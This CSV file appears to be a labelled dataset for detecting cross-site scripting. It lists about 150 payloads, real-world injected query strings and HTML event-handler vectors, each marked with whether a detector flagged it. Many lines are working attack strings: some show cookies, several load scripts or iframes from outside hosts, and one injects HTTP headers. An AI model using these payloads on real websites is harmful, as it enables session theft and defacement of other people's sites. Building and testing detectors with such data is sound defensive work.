Payload,Alert,Detected
s=24014665&e=rr@rr.com&cc=MX&lc=EN&cs=mxdhs1&<br/>n=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,False,1
word=%22%3E%27%3E%3Cscript%3Ealert(123)%3C%2Fscript%3E&category=tagpo<br/>st,False,1
"<set draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</set>",False,1
menu=geoss&feature=user&title=User%20Interface%20Committee}%3C<br/>/style%3E%3Cscript%3Ea=eval;b=alert;a(b(/XSS/.source));%3C/script%3E,False,1
"sidemenu=""><script>alert(""MaXWeL"")</script>",False,1
"d=""><script>alert('Xss')</script>><marquee><h1>By+Narcot<br/>icxs</h1></marquee>",False,1
MIN_SPACECRAFT_CLOCK_START_COUNT=here%22+onMous<br/>eOver=%22alert(/xssed/)&MAX_SPACECRAFT_CLOCK_START_COUNT=and+here%22+onMouseOver=%22alert(/xssed/),False,1
"<label onkeypress=""alert(1)"" contenteditable>test</label>",False,1
nats=%22%3E%3Ciframe%20src=http://pc-kopat.us/hac<br/>ked/%3E,False,0
"<dialog draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</dialog>",False,1
"function=visitbanner&id=RKB00000074&vurl=http:/<br/>/www.'""><script>alert(1337)</script>",False,1
"action=category&id=""><script>alert(/COME-BACK-THE-SH0CK-B0Y/)<<br/>/script>",False,1
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></tt>",False,1
"<img src=x\x11onerror=""javascript:alert(1)"">",False,1
<marquee onwebkitwillrevealbottom=alert(1)>XSS</marquee>,False,1
"<font draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</font>",False,1
"Search=<script>alert(""skathgh420"")</script>",False,1
search=abx%22%3C/title%3E%3Cscript%3Ealert(%27xssed%27)%3C/script%3E<br/>%3C/head%3E&x=0&y=0,False,1
campo_busqueda=%22%3E%3Cscript%3Ealert(123);%3C/scri<br/>pt%3E,False,1
"<style>:target {transform: rotate(180deg);}</style><head id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></head>",False,1
"q=""><script>alert(/xss/);</script>&referer={{PAGE}}",False,1
pg=3%22'/%3E%3Cscript%3Ealert('Hello%20The%20Rat')%<br/>3C/script%3E,False,1
q=%27%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,False,1
"url=noticia.php?id=<iframe src=""http://xssed.com"">",False,0
"<b draggable=""true"" ondragleave=""alert(1)"">test</b>",False,1
<legend onpointerleave=alert(1)>XSS</legend>,False,1
"<audio onmouseup=""alert(1)"" style=display:block>test</audio>",False,1
searWords=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1<br/>337)%3C%2Fscript%3E&Send=site+search,False,1
<menu onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</menu>,False,1
lt=start&search=1&city=...&city_part=...&address=%22%3Cscript%3Ealert%28docume<br/>nt.cookie%29%3B%3C%2Fscript%3E&room=...&area_from=&area_to=&price_from=&price_to=,False,1
directory=ESC&ID=ISS006-E-5759%3Cscript%20src=%22<br/>http://dashboard.byethost13.com/xss.js%22%3E,False,1
"<center onmouseleave=""alert(1)"" style=display:block>test</center>",False,1
"<meta onmouseout=""alert(1)"">test</meta>",False,1
method=log&logerror=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')<br/>%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%<br/>3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu<br/>4.gif%22%3E%3C/CENTER%3E,False,1
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",False,1
"string=<""<<sCrIpT>alert(""ohh... i think... you have an<br/>vulnerability... ESA "")</sCrIpT>",False,1
url=%0AContent-Type:%20text/html%0AContent-Length:12%<br/>0A%0ASaMTHG%20xssed,False,1
MH=http://www.com/<script>alert(document.cookie<br/>)</script>,False,1
zone=%22%3E%3Cscript%3Ealert%28%27Nemessis%27%29%<br/>3C%2Fscript%3E,False,1
TextFritext=%22%3E%3Cscript%3Ealert%2812<br/>3%29%3C%2Fscript%3E,False,1
"order_id=&company=""><script>alert(1);</script<br/>>",False,1
"<IMG SRC=""javascript:alert(4392)""",False,1
page=Account.Apply&id=%22%3E%3Cscript%20src=http://vuln.xssed<br/>.net/thirdparty/scripts/ckers.org.js%3E%3C/script%3E,False,1
query=%27%3Balert%28String.fromCharCode%2888%2C83<br/>%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String<br/>.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F<br/>%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2<br/>FSCRIPT%3E,False,1
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,False,1
id=%22%2F%3E%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E,False,1
cid=<script>alert(/HackedBySpyConfig/)</script>,False,1
"<rt onmouseout=""alert(1)"">AnonKryptiQuz</rt>",False,1
"<frame onmouseout=""alert(1)"">AnonKryptiQuz</frame>",False,1
id=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%<br/>3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,False,1
type=endsite_box&Keywords=%27%22%3E%3Ciframe%20src=http://xs<br/>sed.com%3E,False,0
"<select onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></select>",False,1
"<th onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</th>",False,1
filtras=&products_id=336&gamintojas=%22%3Cscript%3Ealert(document<br/>.cookie);%3C/script%3E,False,1
<footer onpointerdown=alert(1) style=display:block>XSS</footer>,False,1
"<samp onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</samp>",False,1
"nid=-404&badlink=/Search.asp?SearchString=ru""><script>alert(<br/>""BlueMax"")</script>",False,1
"sl=zx&q=%D2%C2%B9%F1'""></title><script>alert(1337)</scrip<br/>t>'""><marquee><h1>XSS by Viper.aT</h1></marquee>",False,1
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,False,1
"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",False,1
"<style>:target {transform: rotate(180deg);}</style><embed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></embed>",False,1
<li onbeforescriptexecute=alert(1)><script>1</script>,False,1
"<nobr ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</nobr>",False,1
<dd onpointerleave=alert(1) style=display:block>AnonKryptiQuz</dd>,False,1
"<font onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></font>",False,1
search_mode=1&keyword=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com<br/>%22%3E&imgfSearch.x=19&imgfSearch.y=10,False,0
method=home&pname=213_7&thpartist=%3Cscript%3Ealert(<br/>123)%3C/script%3E&ptrx=integrated&iframe=true&thptitle=%3Ch1%3EUber0n%3C/h1%3E&thpcampid=fun_mobile_<br/>stuff&thpcid=top_11,False,0
"<ruby onmouseup=""alert(1)"">AnonKryptiQuz</ruby>",False,0
"<IMG STYLE=""xss:expr/*AnonKryptiQuz*/ession(alert('AnonKryptiQuz'))"">",False,1
"<frameset onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></frameset>",False,1
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationstart=""alert(1)""></bdo>",False,1
<image2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</image2><input value=clickme>,False,1
qtype=c&query=%22%3E%3Cscript%3Ealert(1)%3C%2Fscr<br/>ipt%3E,False,1
<cite onpointerout=alert(1) style=display:block>AnonKryptiQuz</cite>,False,1
hlpfile=%3Cscript%3Ejavascript%3Aalert%28document.<br/>domain%29%3C%2Fscript%3E,False,1
id=198&page=233496%22%3E%3Cscript%3Ealert(document<br/>.cookie)%3C/script%3E%3Cmarquee%3E%3CH1%3EXSS%20BY%20XADOS%3CH1%3E%3C/marquee%3E&cid=,False,1
"<shadow onmouseover=""alert(1)"">AnonKryptiQuz</shadow>",False,1
"<label draggable=""true"" ondragenter=""alert(1)"">test</label>",False,1
q=%22%3E%3CSCRIPT%3Ealert%28%27XSS_Alert%27%29%3C%2FSCRIPT%3E&entqr=0&<br/>output=xml_no_dtd&sort=date%3AD%3AL%3Ad1&ie=UTF-8&client=mason_test&ud=1&site=mason_test&y=0&oe=UTF-<br/>8&proxystylesheet=mason_test&x=0,False,1
<label onwebkitmouseforcewillbegin=alert(1)>XSS</label>,False,1
<blockquote onblur=alert(1) id=x tabindex=1 style=display:block>test</blockquote><input value=clickme>,False,1
<input2 onwebkitmouseforceup=alert(1)>XSS</input2>,False,1
q=%3Cscript%3Ealert(0)%3C/script%3E,False,1
domain=%27%22%3E%3C/title%3E%3Cscript%3Ealert%281337<br/>%29%3C/script%3E&submit=query,False,1
<menuitem onpointerout=alert(1) style=display:block>AnonKryptiQuz</menuitem>,False,1
<keygen onmousewheel=alert(1) style=display:block>requires scrolling,False,1
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>,False,1
"lastName=Q}</style><script>a=eval;b=alert;a(b(/<br/>XSS/.source));</script>'""><marquee><h1>Mystick</h1></marquee>",False,1
<strong onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<del onkeyup=""alert(1)"" contenteditable>test</del>",False,1
mixquery=XSS_By_kusomiso.com&mixreqid='%3E%22%3E%3CSCRIPT/SRC=htt<br/>p://kusomiso.com/xss.js%3E%3C/SCRIPT%3E&charset=shift_jis&mixaction=newsearch&submit.x=27&submit.y=1<br/>8&submit=%B8%A1%BA%F7,False,1
"search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14",False,1
lg=fr&recherche_active=1&mot_cles=%22%3E%3Cscript%3Eale<br/>rt%28%27XSS+by+%5CnXylitol%27%29%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%<br/>2Fmarquee%3E&categorie=produits&x=11&y=6,False,1
categoria=%22%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E,False,1
-1<<script>document.cookie=true;</script>,False,1
"reg=80&p_secao=1%20target=%22%3E%3Cscript%3Eale<br/>rt%28String.fromCharCode%2888,83,83%29%29%3C/script%3E",False,1
<html onpointerleave=alert(1)>XSS</html>,False,1
<title onpointermove=alert(1)>XSS</title>,False,1
catid=%22%3E%3Cscript%3Ealert(1)%3C/scrip<br/>t%3E,False,1
"<article onmouseup=""alert(1)"">test</article>",False,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscri<br/>pt%3E,False,1
<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>,False,1
"<details open id=""' &quot;'""ontoggle=alert(1)>",False,1
sitetype=1&section=all&keyword=%22%3E%3Cscrip<br/>t%3Ealert%28%22sa%22%29%3C%2Fscript%3E&advanced=0&x=14&y=9,False,1
video=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3E%3Cmarquee%3<br/>E%3Ch1%3Emeloulisi%3C/h1%3E%3C/marquee%3E,False,1
"<meter onmouseup=""alert(1)"" style=display:block>test</meter>",False,1
eval.call`${'alert\x2823\x29'}`,False,1
k=1&key_search=Fire+Investigation%22%3C/script%3E%3Cscript%3Ealert(<br/>%22Hacked%20:%20)%20CrypTic%22)%3C/script%3E,False,1
config=htdig&restrict=&exclude=&method=and&format=builtin-lon<br/>g&sort=score&words=%22%3cscript%3ealert(%22Found%20by%20Hotpockets%22)%3c/script%3e,False,1
"<br onkeydown=""alert(1)"" contenteditable>test</br>",False,1
"<div/onmouseover='alert(8630)'> style=""x:"">",False,1
"<rb oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</rb>",False,1
"f=""><"">""><script>ale<br/>rt(/THE-SH0CK-B0Y/)</SCRipt>",False,1
sign=3&day=%3Cscript%3Ealert('test')%3C/script%3E&month=6&y<br/>ear=2007,False,1
PBuscar=%22%3E%3Cscript%3Ealert(/xss/);%3C/scrip<br/>t%3E,False,1
{{'a'.constructor('alert(1)')()}},False,1
<script>eval(‘a\u006cert(1)’);</script>,False,1
<embed onmousewheel=alert(1) style=display:block>requires scrolling,False,1
include=<script>alert('MEFISTO');</script>,False,1
<mark onpointermove=alert(1) style=display:block>AnonKryptiQuz</mark>,False,1
nid=%3C%22%3C%3CScRiPT%3Ealert(document.cookie)%3C/ScRiPt%3E,False,1
"HxDB=ugipreshirex&msg=%3Cscript%3Ealert(String.fromChar<br/>Code(83,116,64,82,45,103,97,90,51,114))%3C/script%3E%3Cmarquee%3E%3Ch1%3ESt@R-gaZ3r%3C/h1%3E%3C/marq<br/>uee%3E",False,1
"searchterm=<script>alert(""Ruh Roh! XSS Raggy!"")</script>",False,1
cx=006619950863001976020:e4ki7c-njoy&cof=FORID%3A9&ie=UTF-8&sa=ok&<br/>q=%3C%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,False,1
lang=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,False,1
"<big oncut=""alert(1)"" contenteditable>AnonKryptiQuz</big>",False,1
rec=1</title><ScRiPt%20%0a%0d>alert(123456)%3B</ScRiPt>,False,1
"<embed onmouseup=""alert(1)"">AnonKryptiQuz</embed>",False,1
query=%22%3E%3CscRiPT%3Ealert%28123%29%3C%2FscRiPT%3E<br/>%22&go.x=15&go.y=12&substring=1&bool=and,False,1
file=http://www.gabbyattic.com/jokes/put%20down%20th<br/>e%20gun.mp3&autoStart=false&songVolume=90,False,0
<object onfocus=alert(1) autofocus tabindex=1>,False,1
"msg=<script>alert(document.cookie)</script><<br/>h1><font color=""red"">Thefucker</font></h1>",False,1
<bdo onmousewheel=alert(1) style=display:block>requires scrolling,False,1
achtelfinale';al<br/>ert('Airroxssed');',False,0
";\\""))}catch(e) {confirm(document.location);}//",False,1
<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,False,1
"<data onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</data>",False,1
_=1328995186142&month=%22%3E%3Ciframe%20onloa<br/>d=alert%28document.cookie%29%3E&year=2012,False,1
search=%3Cscript%3Ealert(/XSS%20BY%20WARVECTOR/);%3C/script%3E%3<br/>Ccenter%3E%3Cp%20style=background-color:red;%20color:white;%3E%3Cimg%20src=http://warvector.u7n.org/<br/>images/logo.gif%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20WARVECTOR%20=)%3C/h1%3E%3C/marquee%3E%3C/p%3E,False,1
cal=%3Cscript%3Ealert(1337)%3C/script%3E,False,1
"<source draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</source>",False,1
"<tr onpaste=""alert(1)"" contenteditable>test</tr>",False,1
"sitename=<script>alert(""XSS"")</script>&pagename=<s<br/>cript>alert(""XSS"")</script>",False,1
p=cspetra&s=default%22%3E%3Cscript%3Ealert(/xss/)%3C/script%3E&l=cs,False,1
%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dprompt%2528document.cookie%2529%253B%253E,False,1
"action=""><script>alert(document.cookie)</script>><marquee<br/>><h1>By+Narcoticxs</h1></marquee>",False,1
"<cite onkeypress=""alert(1)"" contenteditable style=display:block>test</cite>",False,1
dateyear=%3Ciframe%20src=%22http://xssed.com/%22%3E,False,0
accion=trivia&categoria=%27%3Balert%28String.fromCharCode%2888%2C83%2C83<br/>%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.from<br/>CharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--<br/>%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRI<br/>PT%3E%3D%26%7B%7D%22%3E%3Cscript+src%3Dhttp%3A%2F%2Fckers.org%2Fs%3E&x=37&y=8&seccion=Trivia,False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></big>",False,1
id=1468&fid=212&PageName=Academie%20Libanais<br/>e%20des%20Beaux%20Arts%3E%3Cscript%3Ealert(document.domain)%3C/script%3E,False,1
"month=""><script>alert(document.cookie)</scri<br/>pt>",False,1
"<cite onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</cite>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style=""position:absolute;"" onanimationcancel=""print()""></xmp>",False,1
email-id=2&layout=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"q=xss&sort=fecha&user_input=HERE%20HAVE%20A%20%20XSS%22onFocus<br/>=confirm(document.cookie);alert(navigator.userAgent);document.write(String.fromCharCode(114,101,100,<br/>100,105,116,46,99,111,109,47,114,47,120,115,115,47));eval(String.fromCharCode(119,105,110,100,111,11<br/>9,46,108,111,99,97,116,105,111,110,46,97,115,115,105,103,110,40,34,104,116,116,112,58,47,47,119,119,<br/>119,46,114,101,100,100,105,116,46,99,111,109,47,114,47,120,115,115,47,34,41)); autofocus%20bad=%22",False,1
"<dd onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dd>",False,1
